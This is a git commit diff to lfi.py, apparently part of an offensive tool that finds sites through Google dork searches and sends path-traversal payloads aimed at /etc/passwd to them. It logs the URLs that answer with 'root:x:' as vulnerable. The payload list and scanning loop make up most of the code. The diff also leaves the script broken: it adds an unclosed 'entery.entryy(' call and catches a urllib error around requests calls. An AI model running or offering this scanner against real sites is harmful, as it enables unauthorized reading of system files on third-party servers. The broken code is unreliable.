ae8cf3e63ef8fb2877ef390e607aa2f342743746
capture0x <61238348+capture0x@users.noreply.github.com>
2023-05-06 07:50:17 -0400

    Update lfi.py

--- lfi.py
+++ lfi.py
@@ -4,13 +4,14 @@ from urllib.parse import unquote
 from colorama import Fore, Style
 import time
 import entery
+import urllib
 
 class LFIScanner:
     def __init__(self):
         self.lfi_payloads = ["../../../../../../../../../../../etc/passwd",
-        		     "../../../../../../../../../../../etc/passwd",
-                             "/..././..././..././..././..././..././..././..././etc/passwd%00",
-                             "../../../../../../../..//etc/passwd"]
+                         "../../../../../../../../../../../etc/passwd",
+                         "/..././..././..././..././..././..././..././etc/passwd%00",
+                         "../../../../../../../..//etc/passwd"]
 
     def google_lfi(self, num_results: int):
         search_engine = "https://www.google.com/search"
@@ -33,45 +34,45 @@ class LFIScanner:
                 for payload in self.lfi_payloads:
                     target_url = f"{url}{payload}"
                     try:
-                        response = requests.get(target_url)
+                        response = requests.get(target_url, timeout=5)
                         if "root:x:" in response.text:
                             print(
                                 Fore.RED + Style.BRIGHT + "[+]" + Fore.GREEN + Style.BRIGHT + "LFI vulnerability found at " + Fore.RED
                                 + Style.BRIGHT + f"{target_url}" + Style.RESET_ALL)
+                            with open("google_lfi_results.txt", "a") as f:
+                                f.write(f"{target_url}\n")
+                                print(Fore.MAGENTA + Style.BRIGHT +"Vulnerability Urls saved in google_lfi_results.txt file...")
                         else:
                             print(
                                 Fore.BLUE + Style.BRIGHT + "[-]" + Fore.GREEN + Style.BRIGHT + f"{target_url}" + Fore.YELLOW + " is not vulnerable to LFI")
-                    except requests.exceptions.ConnectionError:
+                    except urllib.error.URLError:
                         print(
                             Fore.YELLOW + f"[!] Connection error while accessing {target_url}. Retrying in 5 seconds..." + Style.RESET_ALL)
                         time.sleep(5)
 
     def check_lfi(self, url):
         for payload in self.lfi_payloads:
-            r = requests.get(url + payload, headers={"User-Agent": payload})
-            if 'root:x' in r.text:
+            r = requests.get(url + payload, timeout=5)
+            if "root:x" in r.text:
                 print(Fore.RED + Style.BRIGHT + "[+]" + Fore.GREEN + Style.BRIGHT +"LFI vulnerability found at %s%s" % (url, payload))
             else:
                 print(Fore.BLUE + Style.BRIGHT + "[-]" + Fore.GREEN + Style.BRIGHT +"LFI is not found at %s%s" % (url, payload))
         return False
 
-
     def run(self):
         while True:
-            a = input(
-                Fore.YELLOW + Style.BRIGHT + "\t>>> Scan LFI with dork click 1 : \n" + Fore.BLUE + Style.BRIGHT + "\t>>> "
-                                                                                                                "Scan"
-                                                                                                                " LFI "
-                                                                                                                "in "
-                                                                                                                "target url click 2 : \n" + Fore.MAGENTA + Style.BRIGHT + "\t>>> For Quit click 0 : \n"+ Fore.CYAN + Style.BRIGHT +"\t>>>" )
+            a = input(Fore.YELLOW + Style.BRIGHT + "\t>>> Scan LFI with dork click 1 : \n" + Fore.BLUE + Style.BRIGHT + "\t>>> "
+            "Scan"
+            " LFI "
+            "in "
+            "target url click 2 : \n" + Fore.MAGENTA + Style.BRIGHT + "\t>>> For Quit click 0 : \n" + Fore.CYAN + Style.BRIGHT + "\t>>>")
             if a == "1":
-                take_number = input(
-                    Fore.BLUE + Style.BRIGHT + "<Example Result Number: 20>" + Fore.MAGENTA + Style.BRIGHT + "\nEnter "
-                                                                                                             "The "
-                                                                                                             "Number "
-                                                                                                             "Of "
-                                                                                                             "Search "
-                                                                                                             "Results: ")
+                take_number = input(Fore.BLUE + Style.BRIGHT + "<Example Result Number: 10>" + Fore.MAGENTA + Style.BRIGHT + "\nEnter "
+                "The "
+                "Number "
+                "Of "
+                "Search "
+                "Results: ")
                 self.google_lfi(take_number)
                 print(Fore.GREEN + Style.BRIGHT + "Search finished.")
             elif a == "2":
@@ -80,16 +81,21 @@ class LFIScanner:
                     urls = f.readlines()
                 for url in urls:
                     url = url.strip()
-                    self.check_lfi(url)
-                print(Fore.GREEN + Style.BRIGHT + "Search finished.")
+                    if self.check_lfi(url):
+                        print(Fore.GREEN + Style.BRIGHT + "LFI vulnerability found at %s" % url)
+                    else:
+                        print(Fore.BLUE + Style.BRIGHT + "LFI is not found at %s" % url)
+                        print(Fore.GREEN + Style.BRIGHT + "Search finished.")
             elif a == "0":
                 print(Fore.CYAN + Style.BRIGHT + "Quitting...")
                 break
             else:
                 print(Fore.RED + Style.BRIGHT + "Please Choose 1 or 2 !?")
-            input(Fore.YELLOW + Style.BRIGHT + "Press enter to continue...")
+                input(Fore.YELLOW + Style.BRIGHT + "Press enter to continue...")
 
 
-entery.entryy()
-lfi_scanner = LFIScanner()
-lfi_scanner.run()
+if __name__ == "__main__":
+    entery.entryy(
+    scanner = LFIScanner()
+    scanner.run()
+
